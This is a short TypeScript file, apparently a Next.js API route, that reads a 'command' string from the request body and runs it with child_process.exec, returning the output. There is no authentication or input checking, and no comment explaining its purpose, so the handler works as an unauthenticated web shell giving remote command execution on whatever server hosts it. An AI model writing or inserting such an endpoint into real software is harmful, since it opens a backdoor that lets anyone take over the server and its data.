import type { NextApiRequest, NextApiResponse } from "next";
import { exec } from "child_process";

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  const { command } = req.body;
  exec(command, (err, stdout, stderr) => {
    if (err) return res.status(500).json({ error: stderr });
    res.status(200).json({ output: stdout });
  });
}
